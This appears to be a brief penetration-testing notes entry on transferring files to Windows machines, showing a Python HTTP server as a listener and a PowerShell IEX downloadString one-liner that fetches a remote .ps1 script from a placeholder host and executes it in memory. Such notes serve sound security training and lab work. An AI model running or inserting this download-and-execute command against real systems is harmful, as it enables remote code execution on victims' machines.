
## Methods

Methods to transfer file into windows boxes.

1.
### Create listener
```python
python3 -m http.server 80
```

### Windows
```powershell
IEX(New-Object Net.WebClient).downloadString('http://listner.ip.add/file_to_download.ps1')
```